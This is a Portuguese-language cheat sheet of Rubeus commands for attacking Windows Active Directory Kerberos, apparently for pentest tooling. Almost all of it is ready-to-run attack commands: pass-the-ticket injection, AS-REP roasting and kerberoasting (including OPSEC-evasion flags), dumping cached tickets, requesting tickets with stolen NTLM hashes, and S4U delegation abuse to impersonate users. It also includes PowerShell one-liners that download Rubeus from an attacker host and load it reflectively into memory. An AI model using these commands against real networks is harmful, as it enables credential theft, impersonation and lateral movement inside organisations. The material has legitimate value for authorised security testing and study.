# rubeus

% ad, windows, rubeus

## injeta um ticker via um arquivo
#plateform/windows #target/local #cat/UTILS  
```cmd
.\Rubeus.exe ptt /ticket:<ticket>
```

## carrega o rubeus atráves do powershell
#plateform/windows #target/local #cat/UTILS 
```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://<lhost>/Rubeus.exe');$assem = [System.Reflection.Assembly]::Load($data);
```

## executa o rubeus atráves do powershell
#plateform/windows #target/remote #cat/UTILS 
```powershell
[Rubeus.Program]::MainString("klist");
```

## monitor
#plateform/windows #target/remote #cat/ATTACK/EXPLOIT  
```cmd
.\Rubeus.exe monitor /interval:5 /filteruser:<machine_account>
```

## injeta um ticker atráves de um blob base64
#plateform/windows #target/local #cat/UTILS  
```cmd
.\Rubeus.exe ptt /ticket:<BASE64BLOBHERE>
```

## verifica ASPREPRoast para todos os usuários no domínio atual
#plateform/windows #target/remote #cat/ATTACK/EXPLOIT  
```cmd
.\Rubeus.exe asreproast  /format:<AS_REP_response_format> /outfile:<output_hashes_file>
```

## ASREPRoast usuario específico
#plateform/windows #target/remote #cat/ATTACK/EXPLOIT  
```cmd
.\Rubeus.exe asreproast  /user:<user> /domain:<domain_name> /format:<AS_REP_response_format> /outfile:<output_hashes_file>
```

## kerberoasting - domínio atual
#plateform/windows #target/remote #cat/ATTACK/EXPLOIT  
```cmd
.\Rubeus.exe kerberoast /outfile:<output_TGSs_file>
```

## Kerberoasting e escreve a saida em um arquivo com formato especifico
#plateform/windows #target/remote #cat/ATTACK/EXPLOIT  
```cmd
.\Rubeus.exe kerberoast /outfile:<output_TGSs_file> /domain:<domain_name>
```

## Kerberoasting enquanto a "OPESEC" esta segura, essencialmente quando tentamos evitar "roast" contas com AES ativado
#plateform/windows #target/remote #cat/ATTACK/EXPLOIT  
```cmd
.\Rubeus.exe kerberoast /outfile:<output_TGSs_file> /domain:<domain_name> /rc4opsec
```

## Kerberoast contas com o AES habilitado
## Kerberoast AES enabled accounts
#plateform/windows #target/remote #cat/ATTACK/EXPLOIT  
```cmd
.\Rubeus.exe kerberoast /outfile:<output_TGSs_file> /domain:<domain_name> /aes
```
 
## Kerberoast uma conta de usuário específica

#plateform/windows #target/remote #cat/ATTACK/EXPLOIT  
```cmd
.\Rubeus.exe kerberoast /outfile:<output_TGSs_file> /domain:<domain_name> /user:<user> /simple
```

## obter hash
#plateform/windows #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```cmd
.\Rubeus.exe hash /user:<user> /domain:<domain_name> /password:<password>
```

## dump - Ira realizar o dump de qualquer TGS ticket armazenado no cache
#plateform/windows #target/local #cat/POSTEXPLOIT/CREDS_RECOVER 
```
.\Rubeus.exe dump
```
## Solicita e injeta um ticket
#plateform/windows #target/remote #cat/ATTACK/CONNECT 
```
.\Rubeus.exe asktgt /user:<user> /domain:<domain_name> /rc4:<ntlm_hash> /ptt
```

## S4U - com ticket - Delegação restrita (Constrained delegation)
#plateform/windows #target/remote #cat/ATTACK/EXPLOIT 
```
.\Rubeus.exe s4u /ticket:<ticket> /impersonateuser:<user> /msdsspn:ldap/<domain_fqdn> /altservice:cifs /ptt
```
## S4U - com hash - Delegação restrita (Constrained delegation)
#plateform/windows #target/remote #cat/ATTACK/EXPLOIT 
```
.\Rubeus.exe s4u /user:<user> /rc4:<NTLMhashedPasswordOfTheUser> /impersonateuser:<user_to_impersonate> /msdsspn:ldap/<domain_fqdn> /altservice:cifs /domain:<domain_name> /ptt
```

## Obter rc4 da maquina utilizando a senha
#plateform/windows #target/local #cat/POSTEXPLOIT/CREDS_RECOVER 
```
.\Rubeus.exe hash /password:<machine_password>
```

## S4U - Delegação restrita (Constrained delegation) baseada em recurso
#plateform/windows #target/remote #cat/ATTACK/EXPLOIT 
```
.\Rubeus.exe s4u /user:<MachineAccountName> /rc4:<RC4HashOfMachineAccountPassword> /impersonateuser:<user_to_impersonate> /msdsspn:cifs/<domain_fqdn> /domain:<domain_name> /ptt
```

## Rubeus Reflection assembly
#plateform/windows #target/remote #cat/ATTACK/EXPLOIT 
```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://<ip>/Rubeus.exe')  
$assem = [System.Reflection.Assembly]::Load($data)
[Rubeus.Program]::Main("<rubeus_cmd>".Split())
```

= ticket : c:\Temp\ticket.kirbi
= domain_fqdn : MYDC.mydomain.local
= domain_name : mydomain.local
= AS_REP_response_format : hashcat
